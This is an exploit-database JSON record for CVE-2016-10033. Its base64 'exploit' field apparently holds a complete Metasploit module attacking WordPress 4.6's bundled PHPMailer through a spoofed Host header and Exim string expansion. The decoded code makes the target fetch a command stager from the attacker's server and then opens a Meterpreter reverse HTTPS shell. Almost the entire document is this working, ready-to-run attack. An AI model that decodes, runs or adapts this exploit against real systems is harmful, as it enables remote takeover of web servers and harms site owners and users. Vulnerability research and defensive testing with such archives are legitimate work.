{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpjbGFzcyBNZXRhc3Bsb2l0TW9kdWxlIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCg0KICBSYW5rID0gQXZlcmFnZVJhbmtpbmcNCg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIVFRQOjpXb3JkcHJlc3MNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkNtZFN0YWdlcg0KDQogIGRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICAgICAgICAgID0+ICdXb3JkUHJlc3MgUEhQTWFpbGVyIEhvc3QgSGVhZGVyIENvbW1hbmQgSW5qZWN0aW9uJywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgICAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSBjb21tYW5kIGluamVjdGlvbiB2dWxuZXJhYmlsaXR5IGluIFdvcmRQcmVzcw0KICAgICAgICB2ZXJzaW9uIDQuNiB3aXRoIEV4aW0gYXMgYW4gTVRBIHZpYSBhIHNwb29mZWQgSG9zdCBoZWFkZXIgdG8gUEhQTWFpbGVyLA0KICAgICAgICBhIG1haWwtc2VuZGluZyBsaWJyYXJ5IHRoYXQgaXMgYnVuZGxlZCB3aXRoIFdvcmRQcmVzcy4NCg0KICAgICAgICBBIHZhbGlkIFdvcmRQcmVzcyB1c2VybmFtZSBpcyByZXF1aXJlZCB0byBleHBsb2l0IHRoZSB2dWxuZXJhYmlsaXR5Lg0KICAgICAgICBBZGRpdGlvbmFsbHksIGR1ZSB0byB0aGUgYWx0ZXJlZCBIb3N0IGhlYWRlciwgZXhwbG9pdGF0aW9uIGlzIGxpbWl0ZWQgdG8NCiAgICAgICAgdGhlIGRlZmF1bHQgdmlydHVhbCBob3N0LCBhc3N1bWluZyB0aGUgaGVhZGVyIGlzbid0IG1hbmdsZWQgaW4gdHJhbnNpdC4NCg0KICAgICAgICBJZiB0aGUgdGFyZ2V0IGlzIHJ1bm5pbmcgQXBhY2hlIDIuMi4zMiBvciAyLjQuMjQgYW5kIGxhdGVyLCB0aGUgc2VydmVyDQogICAgICAgIG1heSBoYXZlIEh0dHBQcm90b2NvbE9wdGlvbnMgc2V0IHRvIFN0cmljdCwgcHJldmVudGluZyBhIEhvc3QgaGVhZGVyDQogICAgICAgIGNvbnRhaW5pbmcgcGFyZW5zIGZyb20gcGFzc2luZyB0aHJvdWdoLCBtYWtpbmcgZXhwbG9pdGF0aW9uIHVubGlrZWx5Lg0KICAgICAgfSwNCiAgICAgICdBdXRob3InICAgICAgICAgICAgICA9PiBbDQogICAgICAgICdEYXdpZCBHb2x1bnNraScsICMgVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcnkNCiAgICAgICAgJ3d2dScgICAgICAgICAgICAgIyBNZXRhc3Bsb2l0IG1vZHVsZQ0KICAgICAgXSwNCiAgICAgICdSZWZlcmVuY2VzJyAgICAgICAgICA9PiBbDQogICAgICAgIFsnQ1ZFJywgJzIwMTYtMTAwMzMnXSwNCiAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9leHBsb2l0Ym94LmlvL3Z1bG4vV29yZFByZXNzLUV4cGxvaXQtNC02LVJDRS1DT0RFLUVYRUMtQ1ZFLTIwMTYtMTAwMzMuaHRtbCddLA0KICAgICAgICBbJ1VSTCcsICdodHRwOi8vd3d3LmV4aW0ub3JnL2V4aW0taHRtbC1jdXJyZW50L2RvYy9odG1sL3NwZWNfaHRtbC9jaC1zdHJpbmdfZXhwYW5zaW9ucy5odG1sJ10sDQogICAgICAgIFsnVVJMJywgJ2h0dHBzOi8vaHR0cGQuYXBhY2hlLm9yZy9kb2NzLzIuNC9tb2QvY29yZS5odG1sI2h0dHBwcm90b2NvbG9wdGlvbnMnXQ0KICAgICAgXSwNCiAgICAgICdEaXNjbG9zdXJlRGF0ZScgICAgICA9PiAnTWF5IDMgMjAxNycsDQogICAgICAnTGljZW5zZScgICAgICAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnUGxhdGZvcm0nICAgICAgICAgICAgPT4gJ2xpbnV4JywNCiAgICAgICdBcmNoJyAgICAgICAgICAgICAgICA9PiBbQVJDSF9YODYsIEFSQ0hfWDY0XSwNCiAgICAgICdQcml2aWxlZ2VkJyAgICAgICAgICA9PiBmYWxzZSwNCiAgICAgICdUYXJnZXRzJyAgICAgICAgICAgICA9PiBbDQogICAgICAgIFsnV29yZFByZXNzIDQuNiAvIEV4aW0nLCB7fV0NCiAgICAgIF0sDQogICAgICAnRGVmYXVsdFRhcmdldCcgICAgICAgPT4gMCwNCiAgICAgICdEZWZhdWx0T3B0aW9ucycgICAgICA9PiB7DQogICAgICAgICdQQVlMT0FEJyAgICAgICAgICAgPT4gJ2xpbnV4L3g2NC9tZXRlcnByZXRlcl9yZXZlcnNlX2h0dHBzJywNCiAgICAgICAgJ0NNRFNUQUdFUjo6RkxBVk9SJyA9PiAnd2dldCcNCiAgICAgIH0sDQogICAgICAnQ21kU3RhZ2VyRmxhdm9yJyAgICAgPT4gWyd3Z2V0JywgJ2N1cmwnXQ0KICAgICkpDQoNCiAgICByZWdpc3Rlcl9vcHRpb25zKFsNCiAgICAgIE9wdFN0cmluZy5uZXcoJ1VTRVJOQU1FJywgW3RydWUsICdXb3JkUHJlc3MgdXNlcm5hbWUnLCAnYWRtaW4nXSkNCiAgICBdKQ0KDQogICAgcmVnaXN0ZXJfYWR2YW5jZWRfb3B0aW9ucyhbDQogICAgICBPcHRTdHJpbmcubmV3KCdXcml0YWJsZURpcicsIFt0cnVlLCAnV3JpdGFibGUgZGlyZWN0b3J5JywgJy90bXAnXSkNCiAgICBdKQ0KDQogICAgZGVyZWdpc3Rlcl9vcHRpb25zKCdWSE9TVCcsICdVUklQQVRIJykNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgaWYgKHZlcnNpb24gPSB3b3JkcHJlc3NfdmVyc2lvbikNCiAgICAgIHZlcnNpb24gPSBHZW06OlZlcnNpb24ubmV3KHZlcnNpb24pDQogICAgZWxzZQ0KICAgICAgcmV0dXJuIENoZWNrQ29kZTo6U2FmZQ0KICAgIGVuZA0KDQogICAgdnByaW50X3N0YXR1cygiV29yZFByZXNzICN7dmVyc2lvbn0gaW5zdGFsbGVkIGF0ICN7ZnVsbF91cml9IikNCg0KICAgIGlmIHZlcnNpb24gPD0gR2VtOjpWZXJzaW9uLm5ldygnNC42JykNCiAgICAgIENoZWNrQ29kZTo6QXBwZWFycw0KICAgIGVsc2UNCiAgICAgIENoZWNrQ29kZTo6RGV0ZWN0ZWQNCiAgICBlbmQNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBpZiBjaGVjayA9PSBDaGVja0NvZGU6OlNhZmUNCiAgICAgIHByaW50X2Vycm9yKCJJcyBXb3JkUHJlc3MgaW5zdGFsbGVkIGF0ICN7ZnVsbF91cml9ID8iKQ0KICAgICAgcmV0dXJuDQogICAgZW5kDQoNCiAgICAjIFNpbmNlIGV2ZXJ5dGhpbmcgZ29lcyB0aHJvdWdoIHN0cnRvbG93ZXIoKSwgd2UgbmVlZCBsb3dlcmNhc2UNCiAgICBwcmludF9zdGF0dXMoIkdlbmVyYXRpbmcgI3tjbWRzdGFnZXJfZmxhdm9yfSBjb21tYW5kIHN0YWdlciIpDQogICAgQGNtZHN0YWdlciA9IGdlbmVyYXRlX2NtZHN0YWdlcigNCiAgICAgICdQYXRoJyAgID0+ICIvI3tSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhX2xvd2VyKDgpfSIsDQogICAgICA6dGVtcCAgICA9PiBkYXRhc3RvcmVbJ1dyaXRhYmxlRGlyJ10sDQogICAgICA6ZmlsZSAgICA9PiBGaWxlLmJhc2VuYW1lKGNtZHN0YWdlcl9wYXRoKSwNCiAgICAgIDpub3NwYWNlID0+IHRydWUNCiAgICApLmpvaW4oJzsnKQ0KDQogICAgcHJpbnRfc3RhdHVzKCJHZW5lcmF0aW5nIGFuZCBzZW5kaW5nIEV4aW0gcHJlc3RhZ2VyIikNCiAgICBnZW5lcmF0ZV9wcmVzdGFnZXIuZWFjaCBkbyB8Y29tbWFuZHwNCiAgICAgIHZwcmludF9zdGF0dXMoIlNlbmRpbmcgI3tjb21tYW5kfSIpDQogICAgICBzZW5kX3JlcXVlc3RfcGF5bG9hZChjb21tYW5kKQ0KICAgIGVuZA0KICBlbmQNCg0KICAjDQogICMgRXhwbG9pdCBtZXRob2RzDQogICMNCg0KICAjIEFic29sdXRlIHBhdGhzIGFyZSByZXF1aXJlZCBmb3IgcHJlc3RhZ2VyIGNvbW1hbmRzIGR1ZSB0byBleGVjdmUoMikNCiAgZGVmIGdlbmVyYXRlX3ByZXN0YWdlcg0KICAgIHByZXN0YWdlciA9IFtdDQoNCiAgICAjIFRoaXMgaXMgYmFzaWNhbGx5IHNoIC1jIGB3Z2V0YCBpbXBsZW1lbnRlZCB1c2luZyBFeGltIHN0cmluZyBleHBhbnNpb25zDQogICAgIyBCYWRjaGFycyB3ZSBjYW4ndCBlbmNvZGUgYXdheTogXCBmb3IgXG4gKG5ld2xpbmUpIGFuZCA6IG91dHNpZGUgc3RyaW5ncw0KICAgIHByZXN0YWdlciA8PCAnL2Jpbi9zaCAtYyAke3J1bnsvYmluL2VjaG99eyR7ZXh0cmFjdHstMX17JHZhbHVlfScgXA0KICAgICAgInske3JlYWRzb2NrZXR7aW5ldDoje3Nydmhvc3RfYWRkcn06I3tzcnZwb3J0fX0iIFwNCiAgICAgICJ7Z2V0ICN7Z2V0X3Jlc291cmNlfSBodHRwLzEuMCR2YWx1ZSR2YWx1ZX19fX19fSINCg0KICAgICMgQ21kU3RhZ2VyIHNob3VsZCBybSB0aGUgZmlsZSwgYnV0IGl0IGJsb2NrcyBvbiB0aGUgcGF5bG9hZCwgc28gd2UgZG8gaXQNCiAgICBwcmVzdGFnZXIgPDwgIi9iaW4vcm0gLWYgI3tjbWRzdGFnZXJfcGF0aH0iDQogIGVuZA0KDQogIGRlZiBzZW5kX3JlcXVlc3RfcGF5bG9hZChjb21tYW5kKQ0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICAnbWV0aG9kJyAgICAgICAgPT4gJ1BPU1QnLA0KICAgICAgJ3VyaScgICAgICAgICAgID0+IHdvcmRwcmVzc191cmxfbG9naW4sDQogICAgICAnaGVhZGVycycgICAgICAgPT4gew0KICAgICAgICAnSG9zdCcgICAgICAgID0+IGdlbmVyYXRlX2V4aW1fcGF5bG9hZChjb21tYW5kKQ0KICAgICAgfSwNCiAgICAgICd2YXJzX2dldCcgICAgICA9PiB7DQogICAgICAgICdhY3Rpb24nICAgICAgPT4gJ2xvc3RwYXNzd29yZCcNCiAgICAgIH0sDQogICAgICAndmFyc19wb3N0JyAgICAgPT4gew0KICAgICAgICAndXNlcl9sb2dpbicgID0+IGRhdGFzdG9yZVsnVVNFUk5BTUUnXSwNCiAgICAgICAgJ3JlZGlyZWN0X3RvJyA9PiAnJywNCiAgICAgICAgJ3dwLXN1Ym1pdCcgICA9PiAnR2V0IE5ldyBQYXNzd29yZCcNCiAgICAgIH0NCiAgICApDQoNCiAgICBpZiByZXMgJiYgIXJlcy5yZWRpcmVjdD8NCiAgICAgIGlmIHJlcy5jb2RlID09IDIwMCAmJiByZXMuYm9keS5pbmNsdWRlPygnbG9naW5fZXJyb3InKQ0KICAgICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm9BY2Nlc3MsICdXb3JkUHJlc3MgdXNlcm5hbWUgbWF5IGJlIGluY29ycmVjdCcpDQogICAgICBlbHNpZiByZXMuY29kZSA9PSA0MDAgJiYgcmVzLmhlYWRlcnNbJ1NlcnZlciddID1+IC9eQXBhY2hlLw0KICAgICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm90VnVsbmVyYWJsZSwgJ0h0dHBQcm90b2NvbE9wdGlvbnMgbWF5IGJlIFN0cmljdCcpDQogICAgICBlbHNlDQogICAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmV4cGVjdGVkUmVwbHksICJTZXJ2ZXIgcmV0dXJuZWQgY29kZSAje3Jlcy5jb2RlfSIpDQogICAgICBlbmQNCiAgICBlbmQNCg0KICAgIHJlcw0KICBlbmQNCg0KICBkZWYgZ2VuZXJhdGVfZXhpbV9wYXlsb2FkKGNvbW1hbmQpDQogICAgZXhpbV9wYXlsb2FkICA9IFJleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoOCkNCiAgICBleGltX3BheWxvYWQgPDwgIigje1JleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoOCl9ICINCiAgICBleGltX3BheWxvYWQgPDwgIi1iZSAke3J1bnsje2VuY29kZV9leGltX3BheWxvYWQoY29tbWFuZCl9fX0iDQogICAgZXhpbV9wYXlsb2FkIDw8ICIgI3tSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKDgpfSkiDQogIGVuZA0KDQogICMgV2UgY2FuIGVuY29kZSBhd2F5IHRoZSBmb2xsb3dpbmcgYmFkY2hhcnMgdXNpbmcgc3RyaW5nIGV4cGFuc2lvbnMNCiAgZGVmIGVuY29kZV9leGltX3BheWxvYWQoY29tbWFuZCkNCiAgICBjb21tYW5kLmdzdWIoL1tcLyA6XS8sDQogICAgICAnLycgPT4gJyR7c3Vic3RyezB9ezF9eyRzcG9vbF9kaXJlY3Rvcnl9fScsDQogICAgICAnICcgPT4gJyR7c3Vic3RyezEwfXsxfXskdG9kX2xvZ319JywNCiAgICAgICc6JyA9PiAnJHtzdWJzdHJ7MTN9ezF9eyR0b2RfbG9nfX0nDQogICAgKQ0KICBlbmQNCg0KICAjDQogICMgVXRpbGl0eSBtZXRob2RzDQogICMNCg0KICBkZWYgY21kc3RhZ2VyX2ZsYXZvcg0KICAgIGRhdGFzdG9yZVsnQ01EU1RBR0VSOjpGTEFWT1InXQ0KICBlbmQNCg0KICBkZWYgY21kc3RhZ2VyX3BhdGgNCiAgICBAY21kc3RhZ2VyX3BhdGggfHw9DQogICAgICAiI3tkYXRhc3RvcmVbJ1dyaXRhYmxlRGlyJ119LyN7UmV4OjpUZXh0LnJhbmRfdGV4dF9hbHBoYV9sb3dlcig4KX0iDQogIGVuZA0KDQogICMNCiAgIyBPdmVycmlkZSBtZXRob2RzDQogICMNCg0KICAjIFJldHVybiBDbWRTdGFnZXIgb24gZmlyc3QgcmVxdWVzdCwgcGF5bG9hZCBvbiBzZWNvbmQNCiAgZGVmIG9uX3JlcXVlc3RfdXJpKGNsaSwgcmVxdWVzdCkNCiAgICBpZiBAY21kc3RhZ2VyDQogICAgICBwcmludF9nb29kKCJTZW5kaW5nICN7QGNtZHN0YWdlcn0iKQ0KICAgICAgc2VuZF9yZXNwb25zZShjbGksIEBjbWRzdGFnZXIpDQogICAgICBAY21kc3RhZ2VyID0gbmlsDQogICAgZWxzZQ0KICAgICAgcHJpbnRfZ29vZCgiU2VuZGluZyBwYXlsb2FkICN7ZGF0YXN0b3JlWydQQVlMT0FEJ119IikNCiAgICAgIHN1cGVyDQogICAgZW5kDQogIGVuZA0KDQplbmQ=", 
    "filename": "platforms/php/remote/42024.rb", 
    "id": "42024", 
    "cves": [
        "CVE-2016-10033"
    ]
}